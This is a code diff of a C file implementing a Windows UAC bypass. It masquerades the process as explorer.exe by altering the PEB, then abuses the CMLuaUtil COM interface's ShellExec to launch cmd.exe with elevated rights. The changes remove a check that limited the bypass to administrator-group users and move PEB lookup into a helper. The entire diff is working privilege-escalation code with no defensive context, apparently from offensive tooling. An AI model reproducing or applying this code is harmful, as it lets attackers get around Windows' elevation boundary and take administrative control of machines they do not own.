@@ -1,5 +1,6 @@
 #include "uac.h"
 #include "debug.h"
+#include "util.h"
 
 #define PROCESS_TO_MASQUERADE	L"explorer.exe"
 #define CMD_PATH				L"System32\\cmd.exe"
@@ -7,7 +8,7 @@
 static wchar_t g_currentExecutable[MAX_PATH];
 static wchar_t g_cmdPath[MAX_PATH];
 
-static NTSTATUS ucmDccwCOMMethod(_In_ LPWSTR lpszExecutable)
+static NTSTATUS ucmDccwCOMMethod()
 {
 	NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
 	HRESULT r = E_FAIL;
@@ -38,7 +39,7 @@ static NTSTATUS ucmDccwCOMMethod(_In_ LPWSTR lpszExecutable)
 		}
 		
 		r = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil,
-			lpszExecutable,
+			g_cmdPath,
 			g_currentExecutable,
 			NULL,
 			SEE_MASK_DEFAULT,
@@ -57,53 +58,10 @@ static NTSTATUS ucmDccwCOMMethod(_In_ LPWSTR lpszExecutable)
 	return MethodResult;
 }
 
-BOOL isRelatedToAdminGroup()
-{
-	BOOL status = FALSE;
-	HANDLE hToken;
-	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
-		return FALSE;
-
-	// Check if the user is part of the administrators group
-	SID sid;
-	DWORD dwSidSize = 0x44;
-	if (!CreateWellKnownSid(WinBuiltinAdministratorsSid, NULL, &sid, &dwSidSize))
-		goto cleanup;
-
-	BOOL isInAdminGroup;
-	if (!CheckTokenMembership(NULL, &sid, &isInAdminGroup))
-		goto cleanup;
-	if (isInAdminGroup)
-	{
-		status = TRUE;
-		goto cleanup;
-	}
-
-	// Get a handle for a token that is linked with the current process
-	TOKEN_LINKED_TOKEN token;
-	if (!GetTokenInformation(hToken, TokenLinkedToken, &token, sizeof(token), &dwSidSize))
-		goto cleanup;
-
-	// Check if that token is linked to the admin group
-	if (!CheckTokenMembership(token.LinkedToken, &sid, &isInAdminGroup))
-		goto cleanup;
-	if (isInAdminGroup)
-	{
-		status = TRUE;
-		goto cleanup;
-	}
-	
-cleanup:
-	CloseHandle(hToken);
-	return status;
-}
-
 BOOL getAdmin()
 {
 	HANDLE hProcess = GetCurrentProcess();
 	BOOL status = FALSE;
-	if (!isRelatedToAdminGroup())
-		return FALSE;
 	
 	HMODULE hNtdll = GetModuleHandleW(NTDLL_DLL_NAME);
 	if (!hNtdll)
@@ -123,12 +81,11 @@ BOOL getAdmin()
 	
 	wsprintfW(g_cmdPath, L"%ls\\%ls", buffer, CMD_PATH);
 	wsprintfW(buffer + size, L"\\%ls", PROCESS_TO_MASQUERADE);
-
+	
 	// Get PEB
-	PROCESS_BASIC_INFORMATION pbi;
-	if (NT_ERROR(NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL)))
+	FPEB* peb = getPeb();
+	if (!peb)
 		goto cleanup;
-	FPEB* peb = (FPEB*)pbi.PebBaseAddress;
 	
 	// Masquerade the process
 	_RtlEnterCriticalSection(peb->FastPebLock);
@@ -159,7 +116,7 @@ BOOL getAdmin()
 		goto cleanup;
 	
 	// UAC Bypass
-	status = ucmDccwCOMMethod(g_cmdPath) == STATUS_SUCCESS;
+	status = ucmDccwCOMMethod() == STATUS_SUCCESS;
 	
 cleanup:
 	FreeLibrary(hNtdll);
